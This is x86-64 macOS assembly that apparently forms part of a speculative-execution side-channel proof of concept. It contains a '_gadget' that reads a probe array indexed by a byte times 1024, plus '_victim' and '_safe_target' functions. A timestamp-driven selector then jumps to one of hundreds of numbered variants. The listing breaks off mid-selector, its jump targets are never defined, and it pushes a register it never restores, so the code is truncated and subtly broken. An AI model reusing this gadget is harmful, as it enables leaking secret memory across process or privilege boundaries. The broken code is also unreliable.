	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 26, 1
	.globl	_gadget                         ## -- Begin function gadget
	.p2align	4, 0x90
_gadget:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
	movsbl	(%rax), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_safe_target                    ## -- Begin function safe_target
	.p2align	4, 0x90
_safe_target:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movl	$42, %eax
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_victim                         ## -- Begin function victim
	.p2align	4, 0x90
_victim:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	pushq	%rbx
	.cfi_offset %rbx, -24
	movq	%rdi, -16(%rbp)
	movl	%esi, -20(%rbp)
	movl	$0, -24(%rbp)
	movl	$1, -28(%rbp)
LBB2_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	movl	%eax, -20(%rbp)
	movl	-20(%rbp), %eax
	andl	-28(%rbp), %eax
	addl	-24(%rbp), %eax
	movl	%eax, -24(%rbp)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -28(%rbp)
	jmp	LBB2_1
LBB2_4:
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$1000, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_win0_var0
	cmpl	$1, %eax
	je	.Lvictim_win0_var1
	cmpl	$2, %eax
	je	.Lvictim_win0_var2
	cmpl	$3, %eax
	je	.Lvictim_win0_var3
	cmpl	$4, %eax
	je	.Lvictim_win0_var4
	cmpl	$5, %eax
	je	.Lvictim_win0_var5
	cmpl	$6, %eax
	je	.Lvictim_win0_var6
	cmpl	$7, %eax
	je	.Lvictim_win0_var7
	cmpl	$8, %eax
	je	.Lvictim_win0_var8
	cmpl	$9, %eax
	je	.Lvictim_win0_var9
	cmpl	$10, %eax
	je	.Lvictim_win0_var10
	cmpl	$11, %eax
	je	.Lvictim_win0_var11
	cmpl	$12, %eax
	je	.Lvictim_win0_var12
	cmpl	$13, %eax
	je	.Lvictim_win0_var13
	cmpl	$14, %eax
	je	.Lvictim_win0_var14
	cmpl	$15, %eax
	je	.Lvictim_win0_var15
	cmpl	$16, %eax
	je	.Lvictim_win0_var16
	cmpl	$17, %eax
	je	.Lvictim_win0_var17
	cmpl	$18, %eax
	je	.Lvictim_win0_var18
	cmpl	$19, %eax
	je	.Lvictim_win0_var19
	cmpl	$20, %eax
	je	.Lvictim_win0_var20
	cmpl	$21, %eax
	je	.Lvictim_win0_var21
	cmpl	$22, %eax
	je	.Lvictim_win0_var22
	cmpl	$23, %eax
	je	.Lvictim_win0_var23
	cmpl	$24, %eax
	je	.Lvictim_win0_var24
	cmpl	$25, %eax
	je	.Lvictim_win0_var25
	cmpl	$26, %eax
	je	.Lvictim_win0_var26
	cmpl	$27, %eax
	je	.Lvictim_win0_var27
	cmpl	$28, %eax
	je	.Lvictim_win0_var28
	cmpl	$29, %eax
	je	.Lvictim_win0_var29
	cmpl	$30, %eax
	je	.Lvictim_win0_var30
	cmpl	$31, %eax
	je	.Lvictim_win0_var31
	cmpl	$32, %eax
	je	.Lvictim_win0_var32
	cmpl	$33, %eax
	je	.Lvictim_win0_var33
	cmpl	$34, %eax
	je	.Lvictim_win0_var34
	cmpl	$35, %eax
	je	.Lvictim_win0_var35
	cmpl	$36, %eax
	je	.Lvictim_win0_var36
	cmpl	$37, %eax
	je	.Lvictim_win0_var37
	cmpl	$38, %eax
	je	.Lvictim_win0_var38
	cmpl	$39, %eax
	je	.Lvictim_win0_var39
	cmpl	$40, %eax
	je	.Lvictim_win0_var40
	cmpl	$41, %eax
	je	.Lvictim_win0_var41
	cmpl	$42, %eax
	je	.Lvictim_win0_var42
	cmpl	$43, %eax
	je	.Lvictim_win0_var43
	cmpl	$44, %eax
	je	.Lvictim_win0_var44
	cmpl	$45, %eax
	je	.Lvictim_win0_var45
	cmpl	$46, %eax
	je	.Lvictim_win0_var46
	cmpl	$47, %eax
	je	.Lvictim_win0_var47
	cmpl	$48, %eax
	je	.Lvictim_win0_var48
	cmpl	$49, %eax
	je	.Lvictim_win0_var49
	cmpl	$50, %eax
	je	.Lvictim_win0_var50
	cmpl	$51, %eax
	je	.Lvictim_win0_var51
	cmpl	$52, %eax
	je	.Lvictim_win0_var52
	cmpl	$53, %eax
	je	.Lvictim_win0_var53
	cmpl	$54, %eax
	je	.Lvictim_win0_var54
	cmpl	$55, %eax
	je	.Lvictim_win0_var55
	cmpl	$56, %eax
	je	.Lvictim_win0_var56
	cmpl	$57, %eax
	je	.Lvictim_win0_var57
	cmpl	$58, %eax
	je	.Lvictim_win0_var58
	cmpl	$59, %eax
	je	.Lvictim_win0_var59
	cmpl	$60, %eax
	je	.Lvictim_win0_var60
	cmpl	$61, %eax
	je	.Lvictim_win0_var61
	cmpl	$62, %eax
	je	.Lvictim_win0_var62
	cmpl	$63, %eax
	je	.Lvictim_win0_var63
	cmpl	$64, %eax
	je	.Lvictim_win0_var64
	cmpl	$65, %eax
	je	.Lvictim_win0_var65
	cmpl	$66, %eax
	je	.Lvictim_win0_var66
	cmpl	$67, %eax
	je	.Lvictim_win0_var67
	cmpl	$68, %eax
	je	.Lvictim_win0_var68
	cmpl	$69, %eax
	je	.Lvictim_win0_var69
	cmpl	$70, %eax
	je	.Lvictim_win0_var70
	cmpl	$71, %eax
	je	.Lvictim_win0_var71
	cmpl	$72, %eax
	je	.Lvictim_win0_var72
	cmpl	$73, %eax
	je	.Lvictim_win0_var73
	cmpl	$74, %eax
	je	.Lvictim_win0_var74
	cmpl	$75, %eax
	je	.Lvictim_win0_var75
	cmpl	$76, %eax
	je	.Lvictim_win0_var76
	cmpl	$77, %eax
	je	.Lvictim_win0_var77
	cmpl	$78, %eax
	je	.Lvictim_win0_var78
	cmpl	$79, %eax
	je	.Lvictim_win0_var79
	cmpl	$80, %eax
	je	.Lvictim_win0_var80
	cmpl	$81, %eax
	je	.Lvictim_win0_var81
	cmpl	$82, %eax
	je	.Lvictim_win0_var82
	cmpl	$83, %eax
	je	.Lvictim_win0_var83
	cmpl	$84, %eax
	je	.Lvictim_win0_var84
	cmpl	$85, %eax
	je	.Lvictim_win0_var85
	cmpl	$86, %eax
	je	.Lvictim_win0_var86
	cmpl	$87, %eax
	je	.Lvictim_win0_var87
	cmpl	$88, %eax
	je	.Lvictim_win0_var88
	cmpl	$89, %eax
	je	.Lvictim_win0_var89
	cmpl	$90, %eax
	je	.Lvictim_win0_var90
	cmpl	$91, %eax
	je	.Lvictim_win0_var91
	cmpl	$92, %eax
	je	.Lvictim_win0_var92
	cmpl	$93, %eax
	je	.Lvictim_win0_var93
	cmpl	$94, %eax
	je	.Lvictim_win0_var94
	cmpl	$95, %eax
	je	.Lvictim_win0_var95
	cmpl	$96, %eax
	je	.Lvictim_win0_var96
	cmpl	$97, %eax
	je	.Lvictim_win0_var97
	cmpl	$98, %eax
	je	.Lvictim_win0_var98
	cmpl	$99, %eax
	je	.Lvictim_win0_var99
	cmpl	$100, %eax
	je	.Lvictim_win0_var100
	cmpl	$101, %eax
	je	.Lvictim_win0_var101
	cmpl	$102, %eax
	je	.Lvictim_win0_var102
	cmpl	$103, %eax
	je	.Lvictim_win0_var103
	cmpl	$104, %eax
	je	.Lvictim_win0_var104
	cmpl	$105, %eax
	je	.Lvictim_win0_var105
	cmpl	$106, %eax
	je	.Lvictim_win0_var106
	cmpl	$107, %eax
	je	.Lvictim_win0_var107
	cmpl	$108, %eax
	je	.Lvictim_win0_var108
	cmpl	$109, %eax
	je	.Lvictim_win0_var109
	cmpl	$110, %eax
	je	.Lvictim_win0_var110
	cmpl	$111, %eax
	je	.Lvictim_win0_var111
	cmpl	$112, %eax
	je	.Lvictim_win0_var112
	cmpl	$113, %eax
	je	.Lvictim_win0_var113
	cmpl	$114, %eax
	je	.Lvictim_win0_var114
	cmpl	$115, %eax
	je	.Lvictim_win0_var115
	cmpl	$116, %eax
	je	.Lvictim_win0_var116
	cmpl	$117, %eax
	je	.Lvictim_win0_var117
	cmpl	$118, %eax
	je	.Lvictim_win0_var118
	cmpl	$119, %eax
	je	.Lvictim_win0_var119
	cmpl	$120, %eax
	je	.Lvictim_win0_var120
	cmpl	$121, %eax
	je	.Lvictim_win0_var121
	cmpl	$122, %eax
	je	.Lvictim_win0_var122
	cmpl	$123, %eax
	je	.Lvictim_win0_var123
	cmpl	$124, %eax
	je	.Lvictim_win0_var124
	cmpl	$125, %eax
	je	.Lvictim_win0_var125
	cmpl	$126, %eax
	je	.Lvictim_win0_var126
	cmpl	$127, %eax
	je	.Lvictim_win0_var127
	cmpl	$128, %eax
	je	.Lvictim_win0_var128
	cmpl	$129, %eax
	je	.Lvictim_win0_var129
	cmpl	$130, %eax
	je	.Lvictim_win0_var130
	cmpl	$131, %eax
	je	.Lvictim_win0_var131
	cmpl	$132, %eax
	je	.Lvictim_win0_var132
	cmpl	$133, %eax
	je	.Lvictim_win0_var133
	cmpl	$134, %eax
	je	.Lvictim_win0_var134
	cmpl	$135, %eax
	je	.Lvictim_win0_var135
	cmpl	$136, %eax
	je	.Lvictim_win0_var136
	cmpl	$137, %eax
	je	.Lvictim_win0_var137
	cmpl	$138, %eax
	je	.Lvictim_win0_var138
	cmpl	$139, %eax
	je	.Lvictim_win0_var139
	cmpl	$140, %eax
	je	.Lvictim_win0_var140
	cmpl	$141, %eax
	je	.Lvictim_win0_var141
	cmpl	$142, %eax
	je	.Lvictim_win0_var142
	cmpl	$143, %eax
	je	.Lvictim_win0_var143
	cmpl	$144, %eax
	je	.Lvictim_win0_var144
	cmpl	$145, %eax
	je	.Lvictim_win0_var145
	cmpl	$146, %eax
	je	.Lvictim_win0_var146
	cmpl	$147, %eax
	je	.Lvictim_win0_var147
	cmpl	$148, %eax
	je	.Lvictim_win0_var148
	cmpl	$149, %eax
	je	.Lvictim_win0_var149
	cmpl	$150, %eax
	je	.Lvictim_win0_var150
	cmpl	$151, %eax
	je	.Lvictim_win0_var151
	cmpl	$152, %eax
	je	.Lvictim_win0_var152
	cmpl	$153, %eax
	je	.Lvictim_win0_var153
	cmpl	$154, %eax
	je	.Lvictim_win0_var154
	cmpl	$155, %eax
	je	.Lvictim_win0_var155
	cmpl	$156, %eax
	je	.Lvictim_win0_var156
	cmpl	$157, %eax
	je	.Lvictim_win0_var157
	cmpl	$158, %eax
	je	.Lvictim_win0_var158
	cmpl	$159, %eax
	je	.Lvictim_win0_var159
	cmpl	$160, %eax
	je	.Lvictim_win0_var160
	cmpl	$161, %eax
	je	.Lvictim_win0_var161
	cmpl	$162, %eax
	je	.Lvictim_win0_var162
	cmpl	$163, %eax
	je	.Lvictim_win0_var163
	cmpl	$164, %eax
	je	.Lvictim_win0_var164
	cmpl	$165, %eax
	je	.Lvictim_win0_var165
	cmpl	$166, %eax
	je	.Lvictim_win0_var166
	cmpl	$167, %eax
	je	.Lvictim_win0_var167
	cmpl	$168, %eax
	je	.Lvictim_win0_var168
	cmpl	$169, %eax
	je	.Lvictim_win0_var169
	cmpl	$170, %eax
	je	.Lvictim_win0_var170
	cmpl	$171, %eax
	je	.Lvictim_win0_var171
	cmpl	$172, %eax
	je	.Lvictim_win0_var172
	cmpl	$173, %eax
	je	.Lvictim_win0_var173
	cmpl	$174, %eax
	je	.Lvictim_win0_var174
	cmpl	$175, %eax
	je	.Lvictim_win0_var175
	cmpl	$176, %eax
	je	.Lvictim_win0_var176
	cmpl	$177, %eax
	je	.Lvictim_win0_var177
	cmpl	$178, %eax
	je	.Lvictim_win0_var178
	cmpl	$179, %eax
	je	.Lvictim_win0_var179
	cmpl	$180, %eax
	je	.Lvictim_win0_var180
	cmpl	$181, %eax
	je	.Lvictim_win0_var181
	cmpl	$182, %eax
	je	.Lvictim_win0_var182
	cmpl	$183, %eax
	je	.Lvictim_win0_var183
	cmpl	$184, %eax
	je	.Lvictim_win0_var184
	cmpl	$185, %eax
	je	.Lvictim_win0_var185
	cmpl	$186, %eax
	je	.Lvictim_win0_var186
	cmpl	$187, %eax
	je	.Lvictim_win0_var187
	cmpl	$188, %eax
	je	.Lvictim_win0_var188
	cmpl	$189, %eax
	je	.Lvictim_win0_var189
	cmpl	$190, %eax
	je	.Lvictim_win0_var190
	cmpl	$191, %eax
	je	.Lvictim_win0_var191
	cmpl	$192, %eax
	je	.Lvictim_win0_var192
	cmpl	$193, %eax
	je	.Lvictim_win0_var193
	cmpl	$194, %eax
	je	.Lvictim_win0_var194
	cmpl	$195, %eax
	je	.Lvictim_win0_var195
	cmpl	$196, %eax
	je	.Lvictim_win0_var196
	cmpl	$197, %eax
	je	.Lvictim_win0_var197
	cmpl	$198, %eax
	je	.Lvictim_win0_var198
	cmpl	$199, %eax
	je	.Lvictim_win0_var199
	cmpl	$200, %eax
	je	.Lvictim_win0_var200
	cmpl	$201, %eax
	je	.Lvictim_win0_var201
	cmpl	$202, %eax
	je	.Lvictim_win0_var202
	cmpl	$203, %eax
	je	.Lvictim_win0_var203
	cmpl	$204, %eax
	je	.Lvictim_win0_var204
	cmpl	$205, %eax
	je	.Lvictim_win0_var205
	cmpl	$206, %eax
	je	.Lvictim_win0_var206
	cmpl	$207, %eax
	je	.Lvictim_win0_var207
	cmpl	$208, %eax
	je	.Lvictim_win0_var208
	cmpl	$209, %eax
	je	.Lvictim_win0_var209
	cmpl	$210, %eax
	je	.Lvictim_win0_var210
	cmpl	$211, %eax
	je	.Lvictim_win0_var211
	cmpl	$212, %eax
	je	.Lvictim_win0_var212
	cmpl	$213, %eax
	je	.Lvictim_win0_var213
	cmpl	$214, %eax
	je	.Lvictim_win0_var214
	cmpl	$215, %eax
	je	.Lvictim_win0_var215
	cmpl	$216, %eax
	je	.Lvictim_win0_var216
	cmpl	$217, %eax
	je	.Lvictim_win0_var217
	cmpl	$218, %eax
	je	.Lvictim_win0_var218
	cmpl	$219, %eax
	je	.Lvictim_win0_var219
	cmpl	$220, %eax
	je	.Lvictim_win0_var220
	cmpl	$221, %eax
	je	.Lvictim_win0_var221
	cmpl	$222, %eax
	je	.Lvictim_win0_var222
	cmpl	$223, %eax
	je	.Lvictim_win0_var223
	cmpl	$224, %eax
	je	.Lvictim_win0_var224
	cmpl	$225, %eax
	je	.Lvictim_win0_var225
	cmpl	$226, %eax
	je	.Lvictim_win0_var226
	cmpl	$227, %eax
	je	.Lvictim_win0_var227
	cmpl	$228, %eax
	je	.Lvictim_win0_var228
	cmpl	$229, %eax
	je	.Lvictim_win0_var229
	cmpl	$230, %eax
	je	.Lvictim_win0_var230
	cmpl	$231, %eax
	je	.Lvictim_win0_var231
	cmpl	$232, %eax
	je	.Lvictim_win0_var232
	cmpl	$233, %eax
	je	.Lvictim_win0_var233
	cmpl	$234, %eax
	je	.Lvictim_win0_var234
	cmpl	$235, %eax
	je	.Lvictim_win0_var235
	cmpl	$236, %eax
	je	.Lvictim_win0_var236
	cmpl	$237, %eax
	je	.Lvictim_win0_var237
	cmpl	$238, %eax
	je	.Lvictim_win0_var238
	cmpl	$239, %eax
	je	.Lvictim_win0_var239
	cmpl	$240, %eax
	je	.Lvictim_win0_var240
	cmpl	$241, %eax
	je	.Lvictim_win0_var241
	cmpl	$242, %eax
	je	.Lvictim_win0_var242
	cmpl	$243, %eax
	je	.Lvictim_win0_var243
	cmpl	$244, %eax
	je	.Lvictim_win0_var244
	cmpl	$245, %eax
	je	.Lvictim_win0_var245
	cmpl	$246, %eax
	je	.Lvictim_win0_var246
	cmpl	$247, %eax
	je	.Lvictim_win0_var247
	cmpl	$248, %eax
	je	.Lvictim_win0_var248
	cmpl	$249, %eax
	je	.Lvictim_win0_var249
	cmpl	$250, %eax
	je	.Lvictim_win0_var250
	cmpl	$251, %eax
	je	.Lvictim_win0_var251
	cmpl	$252, %eax
	je	.Lvictim_win0_var252
	cmpl	$253, %eax
	je	.Lvictim_win0_var253
	cmpl	$254, %eax
	je	.Lvictim_win0_var254
	cmpl	$255, %eax
	je	.Lvictim_win0_var255
	cmpl	$256, %eax
	je	.Lvictim_win0_var256
	cmpl	$257, %eax
	je	.Lvictim_win0_var257
	cmpl	$258, %eax
	je	.Lvictim_win0_var258
	cmpl	$259, %eax
	je	.Lvictim_win0_var259
	cmpl	$260, %eax
	je	.Lvictim_win0_var260
	cmpl	$261, %eax
	je	.Lvictim_win0_var261
	cmpl	$262, %eax
	je	.Lvictim_win0_var262
	cmpl	$263, %eax
	je	.Lvictim_win0_var263
	cmpl	$264, %eax
	je	.Lvictim_win0_var264
	cmpl	$265, %eax
	je	.Lvictim_win0_var265
	cmpl	$266, %eax
	je	.Lvictim_win0_var266
	cmpl	$267, %eax
	je	.Lvictim_win0_var267
	cmpl	$268, %eax
	je	.Lvictim_win0_var268
	cmpl	$269, %eax
	je	.Lvictim_win0_var269
	cmpl	$270, %eax
	je	.Lvictim_win0_var270
	cmpl	$271, %eax
	je	.Lvictim_win0_var271
	cmpl	$272, %eax
	je	.Lvictim_win0_var272
	cmpl	$273, %eax
	je	.Lvictim_win0_var273
	cmpl	$274, %eax
	je	.Lvictim_win0_var274
	cmpl	$275, %eax
	je	.Lvictim_win0_var275
	cmpl	$276, %eax
	je	.Lvictim_win0_var276
	cmpl	$277, %eax
	je	.Lvictim_win0_var277
	cmpl	$278, %eax
	je	.Lvictim_win0_var278
	cmpl	$279, %eax
	je	.Lvictim_win0_var279
	cmpl	$280, %eax
	je	.Lvictim_win0_var280
	cmpl	$281, %eax
	je	.Lvictim_win0_var281
	cmpl	$282, %eax
	je	.Lvictim_win0_var282
	cmpl	$283, %eax
	je	.Lvictim_win0_var283
	cmpl	$284, %eax
	je	.Lvictim_win0_var284
	cmpl	$285, %eax
	je	.Lvictim_win0_var285
	cmpl	$286, %eax
	je	.Lvictim_win0_var286
	cmpl	$287, %eax
	je	.Lvictim_win0_var287
	cmpl	$288, %eax
	je	.Lvictim_win0_var288
	cmpl	$289, %eax
	je	.Lvictim_win0_var289
	cmpl	$290, %eax
	je	.Lvictim_win0_var290
	cmpl	$291, %eax
	je	.Lvictim_win0_var291
	cmpl	$292, %eax
	je	.Lvictim_win0_var292
	cmpl	$293, %eax
	je	.Lvictim_win0_var293
	cmpl	$294, %eax
	je	.Lvictim_win0_var294
	cmpl	$295, %eax
	je	.Lvictim_win0_var295
	cmpl	$296, %eax
	je	.Lvictim_win0_var296
	cmpl	$297, %eax
	je	.Lvictim_win0_var297
	cmpl	$298, %eax
	je	.Lvictim_win0_var298
	cmpl	$299, %eax
	je	.Lvictim_win0_var299
	cmpl	$300, %eax
	je	.Lvictim_win0_var300
	cmpl	$301, %eax
	je	.Lvictim_win0_var301
	cmpl	$302, %eax
	je	.Lvictim_win0_var302
	cmpl	$303, %eax
	je	.Lvictim_win0_var303
	cmpl	$304, %eax
	je	.Lvictim_win0_var304
	cmpl	$305, %eax
	je	.Lvictim_win0_var305
	cmpl	$306, %eax
	je	.Lvictim_win0_var306
	cmpl	$307, %eax
	je	.Lvictim_win0_var307
	cmpl	$308, %eax
	je	.Lvictim_win0_var308
	cmpl	$309, %eax
	je	.Lvictim_win0_var309
	cmpl	$310, %eax
	je	.Lvictim_win0_var310
	cmpl	$311, %eax
	je	.Lvictim_win0_var311
	cmpl	$312, %eax
	je	.Lvictim_win0_var312
	cmpl	$313, %eax
	je	.Lvictim_win0_var313
	cmpl	$314, %eax
	je	.Lvictim_win0_var314
	cmpl	$315, %eax
	je	.Lvictim_win0_var315
	cmpl	$316, %eax
	je	.Lvictim_win0_var316
	cmpl	$317, %eax
	je	.Lvictim_win0_var317
	cmpl	$318, %eax
	je	.Lvictim_win0_var318
	cmpl	$319, %eax
	je	.Lvictim_win0_var319
	cmpl	$320, %eax
	je	.Lvictim_win0_var320
	cmpl	$321, %eax
	je	.Lvictim_win0_var321
	cmpl	$322, %eax
	je	.Lvictim_win0_var322
	cmpl	$323, %eax
	je	.Lvictim_win0_var323
	cmpl	$324, %eax
	je	.Lvictim_win0_var324
	cmpl	$325, %eax
	je	.Lvictim_win0_var325
	cmpl	$326, %eax
	je	.Lvictim_win0_var326
	cmpl	$327, %eax
	je	.Lvictim_win0_var327
	cmpl	$328, %eax
	je	.Lvictim_win0_var328
	cmpl	$329, %eax
	je	.Lvictim_win0_var329
	cmpl	$330, %eax
	je	.Lvictim_win0_var330
	cmpl	$331, %eax
	je	.Lvictim_win0_var331
	cmpl	$332, %eax
	je	.Lvictim_win0_var332
	cmpl	$333, %eax
	je	.Lvictim_win0_var333
	cmpl	$334, %eax
	je	.Lvictim_win0_var334
	cmpl	$335, %eax
	je	.Lvictim_win0_var335
	cmpl	$336, %eax
	je	.Lvictim_win0_var336
	cmpl	$337, %eax
	je	.Lvictim_win0_var337
	cmpl	$338, %eax
	je	.Lvictim_win0_var338
	cmpl	$339, %eax
	je	.Lvictim_win0_var339
	cmpl	$340, %eax
	je	.Lvictim_win0_var340
	cmpl	$341, %eax
	je	.Lvictim_win0_var341
	cmpl	$342, %eax
	je	.Lvictim_win0_var342
	cmpl	$343, %eax
	je	.Lvictim_win0_var343
	cmpl	$344, %eax
	je	.Lvictim_win0_var344
	cmpl	$345, %eax
	je	.Lvictim_win0_var345
	cmpl	$346, %eax
	je	.Lvictim_win0_var346
	cmpl	$347, %eax
	je	.Lvictim_win0_var347
	cmpl	$348, %eax
	je	.Lvictim_win0_var348
	cmpl	$349, %eax
	je	.Lvictim_win0_var349
	cmpl	$350, %eax
	je	.Lvictim_win0_var350
	cmpl	$351, %eax
	je	.Lvictim_win0_var351
	cmpl	$352, %eax
	je	.Lvictim_win0_var352
	cmpl	$353, %eax
	je	.Lvictim_win0_var353
	cmpl	$354, %eax
	je	.Lvictim_win0_var354
	cmpl	$355, %eax
	je	.Lvictim_win0_var355
	cmpl	$356, %eax
	je	.Lvictim_win0_var356
	cmpl	$357, %eax
	je	.Lvictim_win0_var357
	cmpl	$358, %eax
	je	.Lvictim_win0_var358
	cmpl	$359, %eax
	je	.Lvictim_win0_var359
	cmpl	$360, %eax
	je	.Lvictim_win0_var360
	cmpl	$361, %eax
	je	.Lvictim_win0_var361
	cmpl	$362, %eax
	je	.Lvictim_win0_var362
	cmpl	$363, %eax
	je	.Lvictim_win0_var363
	cmpl	$364, %eax
	je	.Lvictim_win0_var364
	cmpl	$365, %eax
	je	.Lvictim_win0_var365
	cmpl	$366, %eax
	je	.Lvictim_win0_var366
	cmpl	$367, %eax
	je	.Lvictim_win0_var367
	cmpl	$368, %eax
	je	.Lvictim_win0_var368
	cmpl	$369, %eax
	je	.Lvictim_win0_var369
	cmpl	$370, %eax
	je	.Lvictim_win0_var370
	cmpl	$371, %eax
	je	.Lvictim_win0_var371
	cmpl	$372, %eax
	je	.Lvictim_win0_var372
	cmpl	$373, %eax
	je	.Lvictim_win0_var373
	cmpl	$374, %eax
	je	.Lvictim_win0_var374
	cmpl	$375, %eax
	je	.Lvictim_win0_var375
	cmpl	$376, %eax
	je	.Lvictim_win0_var376
	cmpl	$377, %eax
	je	.Lvictim_win0_var377
	cmpl	$378, %eax
	je	.Lvictim_win0_var378
	cmpl	$379, %eax
	je	.Lvictim_win0_var379
	cmpl	$380, %eax
	je	.Lvictim_win0_var380
	cmpl	$381, %eax
	je	.Lvictim_win0_var381
	cmpl	$382, %eax
	je	.Lvictim_win0_var382
	cmpl	$383, %eax
	je	.Lvictim_win0_var383
	cmpl	$384, %eax
	je	.Lvictim_win0_var384
	cmpl	$385, %eax
	je	.Lvictim_win0_var385
	cmpl	$386, %eax
	je	.Lvictim_win0_var386
	cmpl	$387, %eax
	je	.Lvictim_win0_var387
	cmpl	$388, %eax
	je	.Lvictim_win0_var388
	cmpl	$389, %eax
	je	.Lvictim_win0_var389
	cmpl	$390, %eax
	je	.Lvictim_win0_var390
	cmpl	$391, %eax
	je	.Lvictim_win0_var391
	cmpl	$392, %eax
	je	.Lvictim_win0_var392
	cmpl	$393, %eax
	je	.Lvictim_win0_var393
	cmpl	$394, %eax
	je	.Lvictim_win0_var394
	cmpl	$395, %eax
	je	.Lvictim_win0_var395
	cmpl	$396, %eax
	je	.Lvictim_win0_var396
	cmpl	$397, %eax
	je	.Lvictim_win0_var397
	cmpl	$398, %eax
	je	.Lvictim_win0_var398
	cmpl	$399, %eax
	je	.Lvictim_win0_var399
	cmpl	$400, %eax
	je	.Lvictim_win0_var400
	cmpl	$401, %eax
	je	.Lvictim_win0_var401
	cmpl	$402, %eax
	je	.Lvictim_win0_var402
	cmpl	$403, %eax
	je	.Lvictim_win0_var403
	cmpl	$404, %eax
	je	.Lvictim_win0_var404
	cmpl	$405, %eax
	je	.Lvictim_win0_var405
	cmpl	$406, %eax
	je	.Lvictim_win0_var406
	cmpl	$407, %eax
	je	.Lvictim_win0_var407
	cmpl	$408, %eax
	je	.Lvictim_win0_var408
	cmpl	$409, %eax
	je	.Lvictim_win0_var409
	cmpl	$410, %eax
	je	.Lvictim_win0_var410
	cmpl	$411, %eax
	je	.Lvictim_win0_var411
	cmpl	$412, %eax
	je	.Lvictim_win0_var412
	cmpl	$413, %eax
	je	.Lvictim_win0_var413
	cmpl	$414, %eax
	je	.Lvictim_win0_var414
	cmpl	$415, %eax
	je	.Lvictim_win0_var415
	cmpl	$416, %eax
	je	.Lvictim_win0_var416
	cmpl	$417, %eax
	je	.Lvictim_win0_var417
	cmpl	$418, %eax
	je	.Lvictim_win0_var418
	cmpl	$419, %eax
	je	.Lvictim_win0_var419
	cmpl	$420, %eax
	je	.Lvictim_win0_var420
	cmpl	$421, %eax
	je	.Lvictim_win0_var421
	cmpl	$422, %eax
	je	.Lvictim_win0_var422
	cmpl	$423, %eax
	je	.Lvictim_win0_var423
	cmpl	$424, %eax
	je	.Lvictim_win0_var424
	cmpl	$425, %eax
	je	.Lvictim_win0_var425
	cmpl	$426, %eax
	je	.Lvictim_win0_var426
	cmpl	$427, %eax
	je	.Lvictim_win0_var427
	cmpl	$428, %eax
	je	.Lvictim_win0_var428
	cmpl	$429, %eax
	je	.Lvictim_win0_var429
	cmpl	$430, %eax
	je	.Lvictim_win0_var430
	cmpl	$431, %eax
	je	.Lvictim_win0_var431
	cmpl	$432, %eax
	je	.Lvictim_win0_var432
	cmpl	$433, %eax
	je	.Lvictim_win0_var433
	cmpl	$434, %eax
	je	.Lvictim_win0_var434
	cmpl	$435, %eax
	je	.Lvictim_win0_var435
	cmpl	$436, %eax
	je	.Lvictim_win0_var436
	cmpl	$437, %eax
	je	.Lvictim_win0_var437
	cmpl	$438, %eax
	je	.Lvictim_win0_var438
	cmpl	$439, %eax
	je	.Lvictim_win0_var439
	cmpl	$440, %eax
	je	.Lvictim_win0_var440
	cmpl	$441, %eax
	je	.Lvictim_win0_var441
	cmpl	$442, %eax
	je	.Lvictim_win0_var442
	cmpl	$443, %eax
	je	.Lvictim_win0_var443
	cmpl	$444, %eax
	je	.Lvictim_win0_var444
	cmpl	$445, %eax
	je	.Lvictim_win0_var445
	cmpl	$446, %eax
	je	.Lvictim_win0_var446
	cmpl	$447, %eax
	je	.Lvictim_win0_var447
	cmpl	$448, %eax
	je	.Lvictim_win0_var448
	cmpl	$449, %eax
	je	.Lvictim_win0_var449
	cmpl	$450, %eax
	je	.Lvictim_win0_var450
	cmpl	$451, %eax
	je	.Lvictim_win0_var451
	cmpl	$452, %eax
	je	.Lvictim_win0_var452
	cmpl	$453, %eax
	je	.Lvictim_win0_var453
	cmpl	$454, %eax
	je	.Lvictim_win0_var454
	cmpl	$455, %eax
	je	.Lvictim_win0_var455
	cmpl	$456, %eax
	je	.Lvictim_win0_var456
	cmpl	$457, %eax
	je	.Lvictim_win0_var457
	cmpl	$458, %eax
	je	.Lvictim_win0_var458
	cmpl	$459, %eax
	je	.Lvictim_win0_var459
	cmpl	$460, %eax
	je	.Lvictim_win0_var460
	cmpl	$461, %eax
	je	.Lvictim_win0_var461
	cmpl	$462, %eax
	je	.Lvictim_win0_var462
	cmpl	$463, %eax
	je	.Lvictim_win0_var463
	cmpl	$464, %eax
	je	.Lvictim_win0_var464
	cmpl	$465, %eax
	je	.Lvictim_win0_var465
	cmpl	$466, %eax
	je	.Lvictim_win0_var466
	cmpl	$467, %eax
	je	.Lvictim_win0_var467
	cmpl	$468, %eax
	je	.Lvictim_win0_var468
	cmpl	$469, %eax
	je	.Lvictim_win0_var469
	cmpl	$470, %eax
	je	.Lvictim_win0_var470
	cmpl	$471, %eax
	je	.Lvictim_win0_var471
	cmpl	$472, %eax
	je	.Lvictim_win0_var472
	cmpl	$473, %eax
	je	.Lvictim_win0_var473
	cmpl	$474, %eax
	je	.Lvictim_win0_var474
	cmpl	$475, %eax
	je	.Lvictim_win0_var475
	cmpl	$476, %eax
